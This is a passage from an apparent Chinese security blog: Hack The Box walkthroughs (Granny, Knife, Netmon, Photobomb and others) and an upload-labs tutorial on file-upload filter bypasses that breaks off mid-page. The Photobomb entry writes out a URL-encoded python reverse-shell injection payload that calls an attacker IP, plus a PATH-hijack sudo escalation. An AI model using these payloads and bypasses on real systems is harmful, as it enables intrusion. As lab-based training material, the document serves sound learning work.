    <content type="html"><![CDATA[<h1 id="htb-granny"><a href="#htb-granny" class="headerlink" title="htb_granny"></a>htb_granny</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap扫一下端口：</p><p><img src="/2023/04/27/file-upload/mage-20230504104404836-168316916606612.png" alt="image-20230504104404836"></p><p>发现为IIS 6.0，windows系统：</p><p><img src="/2023/04/27/file-upload/mage-20230504104434854-168316916606713.png" alt="image-20230504104434854"></p><p>并且存在http-webdav。</p><p>上面可以看到支持PUT,MOVE等http方法，很自然想到put一个shell.txt，再通过MOVE来执行。</p><p>curl查看信息：</p><p><img src="/2023/04/27/file-upload/mage-20230504104556287-168316916606714.png" alt="image-20230504104556287"></p><p>asp.net。</p><p>此处可以通过burp，发生PUT请求，上传一个txt文件，再move，也可以直接用工具davtest：</p><p><img src="/2023/04/27/file-upload/mage-20230504104710372-168316916606715.png" alt="image-20230504104710372"></p><p>测试发现可以上传文件。</p><p>msfvenom生成asp马，davtest上传：</p><p><img src="/2023/04/27/file-upload/mage-20230504104759856-168316916606716.png" alt="image-20230504104759856"></p><p><img src="/2023/04/27/file-upload/mage-20230504104809685-168316916606717.png" alt="image-20230504104809685"></p><p>接下来move该文件，davtest工具自带了move参数，但是未能成功利用，改用curl：</p><p><img src="/2023/04/27/file-upload/mage-20230504104913150-168316916606718.png" alt="image-20230504104913150"></p><p>msf开启监听，成功回连：</p><p><img src="/2023/04/27/file-upload/mage-20230504104950240-168316916606719.png" alt="image-20230504104950240"></p><p>这里执行getuid或者sysinfo都提示access denied，直接进程迁移即可：</p><p><img src="/2023/04/27/file-upload/mage-20230504105627463-168316916606720.png" alt="image-20230504105627463"></p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>x86系统，接下来用msf自动查找提权模块：</p><p><img src="/2023/04/27/file-upload/mage-20230504105705635-168316916606721.png" alt="image-20230504105705635"></p><p>选择第一个，exploit，拿到system权限：</p><p><img src="/2023/04/27/file-upload/mage-20230504105745329-168316916606311.png" alt="image-20230504105745329"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_knife</title>
    <link href="/2023/05/03/htb-knife/"/>
    <url>/2023/05/03/htb-knife/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-knife"><a href="#htb-knife" class="headerlink" title="htb_knife"></a>htb_knife</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap扫描：</p><p><img src="/2023/04/27/file-upload/age-20230503211205639.png" alt="image-20230503211205639"></p><p>22，80端口开放，进行扫描结果如上。</p><p>火狐访问：</p><p><img src="/2023/04/27/file-upload/age-20230503211315489.png" alt="image-20230503211315489"></p><p>看起来是个静态页面，尝试目录爆破：</p><p><img src="/2023/04/27/file-upload/age-20230503211338356.png" alt="image-20230503211338356"></p><p>没有可用信息。</p><p>尝试curl</p><p><img src="/2023/04/27/file-upload/age-20230503212322026.png" alt="image-20230503212322026"></p><p>发现php&#x2F;8.1.0-dev，searchsploit搜索：<br><img src="/2023/04/27/file-upload/age-20230503212552202.png" alt="image-20230503212552202"></p><p>直接利用py脚本：</p><p><img src="/2023/04/27/file-upload/age-20230503212837304.png" alt="image-20230503212837304"></p><p>getshell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>使用上述脚本连接的shell不稳定，直接在ua里弹shell，nc监听：</p><p><img src="/2023/04/27/file-upload/age-20230503212939601.png" alt="image-20230503212939601"></p><p><img src="/2023/04/27/file-upload/age-20230503213001126.png" alt="image-20230503213001126"></p><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/age-20230503213116184.png" alt="image-20230503213116184"></p><p>可以sudo执行knife文件。</p><p>使用file和strings命令查看knife：</p><p><img src="/2023/04/27/file-upload/age-20230503213202030.png" alt="image-20230503213202030"></p><p>大概看出为一个rb的可执行文件。</p><p>&#x2F;usr&#x2F;bin&#x2F;knife -h:</p><p><img src="/2023/04/27/file-upload/age-20230503213358978.png" alt="image-20230503213358978"></p><p>knife exec [script]</p><p>因此写一个rb文件，给bash加suid，再通过&#x2F;bin&#x2F;bash -p提权：</p><p><img src="/2023/04/27/file-upload/age-20230503213445945.png" alt="image-20230503213445945"></p><p>成功拿到root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_netmon</title>
    <link href="/2023/05/03/htb-netmon/"/>
    <url>/2023/05/03/htb-netmon/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-netmon"><a href="#htb-netmon" class="headerlink" title="htb_netmon"></a>htb_netmon</h1><p>首先是nmap扫描：</p><p><code>nmap -p- --min-rate=1000 -T4 10.10.10.152</code></p><p><img src="/2023/04/27/file-upload/mage-20230503200138890.png" alt="image-20230503200138890"></p><p>ftp服务开放，ftp尝试匿名登录：</p><p><img src="/2023/04/27/file-upload/mage-20230503200318244.png" alt="image-20230503200318244"></p><p>在public目录下发现user.txt.</p><p>接下来考虑http服务。</p><p>仔细扫一下80口：</p><p><img src="/2023/04/27/file-upload/mage-20230503200414831.png" alt="image-20230503200414831"></p><p>发现为PRTG 18.1，火狐访问：<br><img src="/2023/04/27/file-upload/mage-20230503200507925.png" alt="image-20230503200507925"></p><p>需要账号密码进行登录，尝试prtg默认密码prtgadmin&#x2F;prtgadmin失败，再次回到ftp寻找：</p><p><img src="/2023/04/27/file-upload/mage-20230503200600225.png" alt="image-20230503200600225"></p><p>最终在&#x2F;users&#x2F;all user&#x2F;paessler&#x2F;prtg network monitor目录下找到配置文件（看wp得知）。</p><p>接下来搜索密码相关字符：</p><p><img src="/2023/04/27/file-upload/mage-20230503200714445.png" alt="image-20230503200714445"></p><p>找到prtgadmin&#x2F;PrTg@dmin2018</p><p>利用这组账号登录，失败，正确密码为PrTg@dmin2019(参考wp得知)。</p><p>searchsploit搜索相关漏洞：</p><p><img src="/2023/04/27/file-upload/mage-20230503200847852.png" alt="image-20230503200847852"></p><p>存在RCE，查看sh文件：</p><p><img src="/2023/04/27/file-upload/mage-20230503200916968.png" alt="image-20230503200916968"></p><p>CVE-2018-9276.</p><p>github下载相关利用poc：</p><p><img src="/2023/04/27/file-upload/mage-20230503200959209.png" alt="image-20230503200959209"></p><p>直接为system权限：</p><p><img src="/2023/04/27/file-upload/mage-20230503201012353.png" alt="image-20230503201012353"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_cap</title>
    <link href="/2023/05/02/htb-cap/"/>
    <url>/2023/05/02/htb-cap/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-cap"><a href="#htb-cap" class="headerlink" title="htb_cap"></a>htb_cap</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>端口扫描：</p><p><code>nmap -p- --min-rate=1000 -T4 10.10.10.245</code></p><p><img src="/2023/04/27/file-upload/e-20230502220157451.png" alt="image-20230502220157451"></p><p><code>nmap -sC -sV -A -p 21,22,80 10.10.10.245</code></p><p><img src="/2023/04/27/file-upload/e-20230502221443622.png" alt="image-20230502221443622"></p><p>开放了21，22，80端口，首先尝试从80http服务突破，访问：</p><p><img src="/2023/04/27/file-upload/e-20230502223709813.png" alt="image-20230502223709813"></p><p>点击security snapshots：</p><p><img src="/2023/04/27/file-upload/e-20230502224340252.png" alt="image-20230502224340252"></p><p>发现url变为&#x2F;data&#x2F;1.</p><p>此时将url改为&#x2F;data&#x2F;0,页面改变，出现流量，点击下载，查看下载的pcap：</p><p><img src="/2023/04/27/file-upload/e-20230502224432032.png" alt="image-20230502224432032"></p><p>发现tfp流量，查看内容：</p><p><img src="/2023/04/27/file-upload/e-20230502224603202.png" alt="image-20230502224603202"></p><p>找到ftp账号密码。</p><p>接下来使用ftp登录：</p><p><img src="/2023/04/27/file-upload/e-20230502224824145.png" alt="image-20230502224824145"></p><p>找到user.txt。</p><p>再用这组账号尝试直接登录ssh：</p><p><img src="/2023/04/27/file-upload/e-20230502224913833.png" alt="image-20230502224913833"></p><p>成功，接下来提权到root。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>从本地使用wget下载linpeas到靶机上，加执行权限运行：</p><p><img src="/2023/04/27/file-upload/e-20230502225620044.png" alt="image-20230502225620044"></p><p>这里标注出，python3.8，有cap_setuid权限。</p><p>gtfobins网站搜索：</p><p><img src="/2023/04/27/file-upload/e-20230502225710519.png" alt="image-20230502225710519"></p><p>尝试执行：</p><p><img src="/2023/04/27/file-upload/e-20230502225740390.png" alt="image-20230502225740390"></p><p>成功提权到root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_legacy</title>
    <link href="/2023/05/01/htb-legacy/"/>
    <url>/2023/05/01/htb-legacy/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-legacy"><a href="#htb-legacy" class="headerlink" title="htb_legacy"></a>htb_legacy</h1><p>nmap端口扫描：</p><p><img src="/2023/04/27/file-upload/mage-20230501142850551.png" alt="image-20230501142850551"></p><p>扫服务：</p><p><img src="/2023/04/27/file-upload/mage-20230501142914119.png" alt="image-20230501142914119"></p><p>开放135，139，445端口，考虑ms17010，先用nmap进行漏洞扫描：</p><p><code>nmap -sC -sV -A -p 135,139,445 --script vuln 10.10.10.4</code></p><p><img src="/2023/04/27/file-upload/mage-20230501143008849.png" alt="image-20230501143008849"></p><p>ms08-067 vulnerable。</p><p>msf：</p><p><img src="/2023/04/27/file-upload/mage-20230501143055349.png" alt="image-20230501143055349"></p><p>getshell，system权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_lame</title>
    <link href="/2023/05/01/htb-lame/"/>
    <url>/2023/05/01/htb-lame/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-lame"><a href="#htb-lame" class="headerlink" title="htb_lame"></a>htb_lame</h1><p>nmap扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501211833742.png" alt="image-20230501211833742"></p><p>服务探测：</p><p><img src="/2023/04/27/file-upload/ge-20230501211850783.png" alt="image-20230501211850783"></p><p>漏洞扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501211911579.png" alt="image-20230501211911579"></p><p>没有直接发现可利用漏洞。</p><p>使用searchsploit搜索相关漏洞：</p><p><img src="/2023/04/27/file-upload/ge-20230501212032502.png" alt="image-20230501212032502"></p><p>首先是vsftpd，找到一个后门，尝试后无果，跳过。</p><p>接下来是samba：</p><p><img src="/2023/04/27/file-upload/ge-20230501212113153.png" alt="image-20230501212113153"></p><p>发现命令注入漏洞，但是在msf模块中，尽量避免使用msf：</p><p><img src="/2023/04/27/file-upload/ge-20230501212313179.png" alt="image-20230501212313179"></p><p>直接查看rb脚本，发现CVE-2007-2447。</p><p>github搜索并git clone exp：</p><p><img src="/2023/04/27/file-upload/ge-20230501212415484.png" alt="image-20230501212415484"></p><p><img src="/2023/04/27/file-upload/ge-20230501212444089.png" alt="image-20230501212444089"></p><p>本地起监听，攻击成功，root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_jerry</title>
    <link href="/2023/05/01/htb-jerry/"/>
    <url>/2023/05/01/htb-jerry/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-jerry"><a href="#htb-jerry" class="headerlink" title="htb_jerry"></a>htb_jerry</h1><p>nmap先端口扫描：</p><p><img src="/2023/04/27/file-upload/age-20230501213312119.png" alt="image-20230501213312119"></p><p>8080的http服务，firefox访问看看：</p><p><img src="/2023/04/27/file-upload/age-20230501213335521.png" alt="image-20230501213335521"></p><p>tomcat。使用tomcat字典进行目录爆破，先查找tomcat字典：</p><p><img src="/2023/04/27/file-upload/age-20230501213409061.png" alt="image-20230501213409061"></p><p>爆破：</p><p><img src="/2023/04/27/file-upload/age-20230501213425390.png" alt="image-20230501213425390"></p><p>访问之后，发现只有manager可利用，为登录页面：</p><p><img src="/2023/04/27/file-upload/age-20230501213449833.png" alt="image-20230501213449833"></p><p>tomcat&#x2F;tomcat登录失败。此时点击cancel：</p><p><img src="/2023/04/27/file-upload/age-20230501213512808.png" alt="image-20230501213512808"></p><p>返回401页面，并包含了tomcat&#x2F;s3cret的一组账号密码：</p><p><img src="/2023/04/27/file-upload/age-20230501213556528.png" alt="image-20230501213556528"></p><p>成功登录。</p><p>接下来就是上传war来getshell：</p><p><img src="/2023/04/27/file-upload/age-20230501214307244.png" alt="image-20230501214307244"></p><p>msfvenom生成war格式的马，上传：</p><p><img src="/2023/04/27/file-upload/age-20230501214326514.png" alt="image-20230501214326514"></p><p>上传成功，msf中开监听，点击&#x2F;shell即可上线：</p><p><img src="/2023/04/27/file-upload/age-20230501214524229.png" alt="image-20230501214524229"></p><p>查看whoami，system权限：</p><p><img src="/2023/04/27/file-upload/age-20230501214538005.png" alt="image-20230501214538005"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_blue</title>
    <link href="/2023/05/01/htb-blue/"/>
    <url>/2023/05/01/htb-blue/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-blue"><a href="#htb-blue" class="headerlink" title="htb_blue"></a>htb_blue</h1><p>nmap端口扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501102723572.png" alt="image-20230501102723572"></p><p>扫具体服务：</p><p><img src="/2023/04/27/file-upload/ge-20230501102743582.png" alt="image-20230501102743582"></p><p>win7&#x2F;win2008，开放了139，445端口，ms17-010：</p><p><img src="/2023/04/27/file-upload/ge-20230501102958871.png" alt="image-20230501102958871"></p><p>getshell，system权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_photobomb</title>
    <link href="/2023/04/28/htb-photobomb/"/>
    <url>/2023/04/28/htb-photobomb/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-photobomb"><a href="#htb-photobomb" class="headerlink" title="htb_photobomb"></a>htb_photobomb</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先使用nmap简单扫一下端口：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125553727.png" alt="image-20230428125553727"></p><p>加上参数扫服务：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125623120.png" alt="image-20230428125623120"></p><p>火狐访问http服务，dns解析出错：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125831914.png" alt="image-20230428125831914"></p><p>域名加到hosts文件：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125940041.png" alt="image-20230428125940041"></p><p>成功：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125955771.png" alt="image-20230428125955771"></p><p>to get started, please click here,点击超链：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130205321.png" alt="image-20230428130205321"></p><p>弹出一个登录框，无法抓取流量，应该是前端校验。</p><p>尝试目录爆破：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130417051.png" alt="image-20230428130417051"></p><p>也没有可利用内容。</p><p>查看源代码：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130456002.png" alt="image-20230428130456002"></p><p>出现可疑js文件，photobomb.js:</p><p><img src="/2023/04/27/file-upload/b/image-20230428130526194.png" alt="image-20230428130526194"></p><p><code>http://pH0t0:b0Mb!@photobomb.htb/printer</code>尝试用此处的pH0t0:b0Mb!作为用户密码进行登录：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130702335.png" alt="image-20230428130702335"></p><p>登录成功。</p><p>页面有下载图片功能，用burp查看具体流量：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130947611.png" alt="image-20230428130947611"></p><p>对photo，filetype等参数测试sql漏洞无果，尝试命令拼接rce。</p><p>首先本地开启http-server：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131139256.png" alt="image-20230428131139256"></p><p><img src="/2023/04/27/file-upload/b/image-20230428131041281.png" alt="image-20230428131041281"></p><p>修改photo参数，输入命令<code>;curl 10.10.16.2</code>，使用ctrl+u，对命令进行编码，空格自动替换为+，发送请求后无响应。</p><p>接下来尝试filetype参数：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131530670.png" alt="image-20230428131530670"></p><p>本地成功接受到curl请求，可以判断存在命令注入：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131517217.png" alt="image-20230428131517217"></p><p>接下来直接反弹shell：</p><p><code>;export+RHOST=&quot;10.10.16.2&quot;;export+RPORT=4444;python3+-c+&#39;import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>同样需要ctrl+u编码：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131733399.png" alt="image-20230428131733399"></p><p>成功接收到shell。</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>在home下发现user.txt：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132024695.png" alt="image-20230428132024695"></p><p>尝试sudo提权：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132100862.png" alt="image-20230428132100862"></p><p>可以用root权限执行&#x2F;opt&#x2F;cleanup.sh，通过crontab也发现该文件：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132201958.png" alt="image-20230428132201958"></p><p>查看cleanup.sh:</p><p><img src="/2023/04/27/file-upload/b/image-20230428132227028.png" alt="image-20230428132227028"></p><p>注意最后一行，用到了find命令，但是没有使用绝对路径，因此通过路径劫持提权，步骤如下：</p><ul><li>新建一个find文件，通过find文件获取root shell</li><li>更改环境变量，使得sudo运行cleanup.sh时首先使用新建的find</li></ul><p>首先新建find文件，内容为”&#x2F;bin&#x2F;bash”:</p><p><img src="/2023/04/27/file-upload/b/image-20230428132623018.png" alt="image-20230428132623018"></p><p>&#x2F;opt目录不可写，因此写到&#x2F;tmp目录下。</p><p>赋予执行权限：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132708609.png" alt="image-20230428132708609"></p><p>接下来更改环境变量，sudo执行：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132751987.png" alt="image-20230428132751987"></p><p>执行后依然是wizard权限，未获得root权限的shell。</p><p>重新执行<code>sudo PATH=/TMP:$PATH /opt/cleanup.sh</code>后，提权成功：</p><p><img src="/2023/04/27/file-upload/b/image-20230428133006076.png" alt="image-20230428133006076"></p><p>因为<strong>使用sudo执行一条命令时，会起一个新的shell，因此需要在sudo命令后更改环境变量！</strong></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>file_upload</title>
    <link href="/2023/04/27/file-upload/"/>
    <url>/2023/04/27/file-upload/</url>
    
    <content type="html"><![CDATA[<h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file_upload"></a>file_upload</h1><p><img src="/file-upload/pic.jpg" alt="pic"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>简单来说，存在文件上传，就可能存在文件上传漏洞。上传文件时，如果未对上传的文件进行严格的验证和过滤，就可能导致传入非法文件，例如木马等等。</p><h3 id="文件上传的危害"><a href="#文件上传的危害" class="headerlink" title="文件上传的危害"></a>文件上传的危害</h3><p>上传漏洞与SQL注入或 XSS相比，其风险更大。</p><p>如果 Web应用程序存在上传漏洞，攻击者上传的文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，就会导致代码执行。如果上传的文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为。如果上传的文件是钓鱼图片或者包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。甚至攻击者可以直接上传一个webshell到服务器上完全控制系统。</p><h3 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h3><ul><li><p>fofa等引擎搜索。例如inurl:upload.php.</p></li><li><p>黑盒。使用敏感目录扫描工具查找:御剑后台扫描工具，dirsearch等等。</p></li><li><p>白盒。找对cms，看源码。</p></li><li><p>后台查找。进入后台之后并不能获得网站权限，只是后台权限，可以通过登录后台进行文件上传从而获得整个网站的权限。</p></li><li><p>会员中心，个人资料等模块查找。</p></li></ul><p>找到上传点之后，是否具有上传漏洞，具体情况需要结合抓包情况查看。</p><h3 id="upload-labs靶场介绍"><a href="#upload-labs靶场介绍" class="headerlink" title="upload-labs靶场介绍"></a>upload-labs靶场介绍</h3><p><img src="/file-upload/uploadlabs.png" alt="image-20211025002900015"></p><p>upload-labs是一个使用php语言编写的，专门收集渗透测试过程中遇到的各种上传漏洞的靶场。提供了文件上传的各种不同环境，用以进行原理的学习。</p><p>项目地址:<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>本文档主要介绍文件上传部分内容，靶场搭建等部分不进行详细讲解，可以参考：<a href="https://blog.csdn.net/qq_32448559/article/details/81667309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163509252516780271586181%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163509252516780271586181&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81667309.first_rank_v2_pc_rank_v29&utm_term=uploadlabs%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_32448559/article/details/81667309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163509252516780271586181%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163509252516780271586181&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81667309.first_rank_v2_pc_rank_v29&amp;utm_term=uploadlabs%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187</a></p><h3 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a>需要注意的地方</h3><ul><li>格式</li></ul><p>正常情况下，如果将php木马上传到网站，但格式为jpg格式，一般是无法成功进行利用的（无解析漏洞）。需要注意网站所使用的语言以及上传文件的格式类型。</p><ul><li>分类</li></ul><p>对于文件上传漏洞，需要注意的是清楚地把握住出现漏洞的点。例如是编辑器漏洞，还是第三方应用漏洞，或者是代码的逻辑中存在漏洞。针对不同的漏洞，应该采用更有针对性的方法。在下文会对不同的分类具体展开。</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><h4 id="js类防护"><a href="#js类防护" class="headerlink" title="js类防护"></a>js类防护</h4><p><strong>Pass-01</strong></p><ul><li>靶场环境中，可以直接删除js过滤代码</li><li>真实环境中可以考虑浏览器禁用js（可能会导致正常功能无法使用，不推荐）</li></ul><p>浏览器禁用javascript方法（Firefox为例）：</p><p>搜索栏中输入about:config，确定之后搜索javascript.enabled,点击切换即可禁用js脚本</p><p><img src="/file-upload/firefox.png" alt="image-20211025135825125"></p><p>Tips:有时候上传文件使用burp抓包无法捕获到流量，可能就是因为采用了本地js的验证方法。</p><p><strong>防护措施</strong></p><p>尽量使用后端验证</p><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>文件上传的后端验证主要有后缀名，文件类型和文件头等等。其中后缀名主要使用黑白名单进行验证，文件类型主要通过MIME信息验证，而文件头一般通过内容头进行校验。</p><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>黑名单验证是指只要后缀名不在给定的数组中，就不会被拦截，可以进行上传。常见的黑名单有asp,php,jsp,aspx,cgi,war等等。一般可以通过如下几种方式绕过：</p><h5 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h5><p><strong>Pass-03</strong></p><p>首先查看源码：</p><p><img src="/file-upload/pass3code.png" alt="image-20211025145816144"></p><p>典型的黑名单过滤，上传php文件，上传失败：</p><p><img src="/file-upload/fail.png" alt="image-20211025144503909"></p><p>以最常用的php为例，如果黑名单中只有.php后缀，可以通过php3,php5,phtml等未被过滤的后缀名进行绕过，上传.php5进行测试：</p><p><img src="/file-upload/pass3s.png" alt="image-20211025150600496"></p><p>上传成功。</p><p>对于该绕过方法，在Apache服务器中，可以通过更改Apache httpd.conf配置文件，添加.php3 和.phtml，并且取消注释，来实现对php3,phtml等文件的解析。</p><p><img src="/file-upload/apache.png" alt="image-20211025150142567"></p><p><strong>防护措施</strong></p><p>拓展黑名单的内容，并且对服务器配置进行严格限制，即使文件上传也无法解析</p><h5 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h5><p>.htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>Tips:只有Apache才可以</p><p><strong>Pass-04</strong></p><p>查看源码：</p><p><img src="/file-upload/pass4code.png" alt="image-20211025163819926"></p><p>可以看出，这里也是使用了黑名单的方式进行过滤。但是.htaccess并不在黑名单中，因此首先上传.htaccess文件：</p><p><img src="/file-upload/htaccess.png" alt="image-20211025152331749"></p><p>这里.htaccess文件的意义是将后续上传的文件，当作php来进行解析。</p><p>Tips:</p><ul><li>如果上传的内容如上图所示，那么后续上传的文件名或后缀名中需要包含有info，也就是双引号中的值。</li><li>如果文件的内容为<code>setHandler application/x-httpd-php</code>，那么，任意形式的文件都会被当作php解析。</li><li>文件名后缀命名时记得绕开黑名单中的后缀名。</li><li>上传的.htaccess文件，通过记事本可能无法保存，可以通过burp修改文件名或者使用Notepad++保存文件。</li></ul><p>接下来对上传的info.abc进行测试：</p><p><img src="/file-upload/pass4s.png" alt="image-20211025164521803"></p><p>上传成功，查看phpinfo:</p><p><img src="/file-upload/pass4info.png" alt="image-20211025164609493"></p><p>成功解析成php文件。</p><p><strong>防护措施</strong></p><p>禁止上传.htaccess文件，可以通过snort对filename的内容进行检测</p><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p><strong>Pass-05</strong></p><p>查看源码：</p><p><img src="/file-upload/pass5code.png" alt="image-20211025164929968"></p><p>使用黑名单进行过滤，这里直接使用大小写绕过：</p><p><img src="/file-upload/pass5s.png" alt="image-20211025165114713"></p><p>成功上传php文件。</p><p><strong>防护措施</strong></p><p>拓展黑名单内容</p><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p><strong>Pass-06</strong></p><p>查看源码：</p><p><img src="/file-upload/pass6code.png" alt="image-20211025165335192"></p><p>发现这里没有使用trim()函数，也就是没有对空格进行过滤。因此尝试使用空格绕过：</p><p><img src="/file-upload/pass6s.png" alt="image-20211025165548554"></p><p>使用burp在filename内容最后加上空格，绕过黑名单验证，成功上传。</p><p>Tips:</p><ul><li>必须抓包后在最后添加空格，如果直接在本地文件后缀加空格会被自动删除。</li><li>抓包添加空格之后，会绕过黑名单的验证，但是保存到服务器之后，文件最后的空格还是会被删除，最终还是php文件。</li></ul><p><strong>防护措施</strong></p><p>拓展黑名单，或者使用函数删除文件名末尾的空格再进行过滤。</p><p>也可写规则对空格0d0a进行匹配。</p><h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p><strong>Pass-07</strong></p><p>源码如下：</p><p><img src="/file-upload/pass7code.png" alt="image-20211025170004591"></p><p>这里少了deldot()函数，即删除文件名末尾的点。</p><p>这里思路和空格绕过相同，但是同样需要注意只能通过抓包修改，直接在本地修改会默认删除最后的点，抓包添加点之后会绕过黑名单，但是保存到服务器之后同样最后的点会被删除，还是原来的文件格式：</p><p><img src="/file-upload/pass7s.png" alt="image-20211025170344273"></p><p><img src="/file-upload/type.png" alt="image-20211025170445942"></p><p>到上传目录查看，还是原理的php格式，并能成功解析。</p><p><strong>防护措施</strong></p><p>使用函数先删除文件名末尾的.再进行过滤。</p><p>写规则对点0d0a进行匹配。</p><h5 id="DATA绕过"><a href="#DATA绕过" class="headerlink" 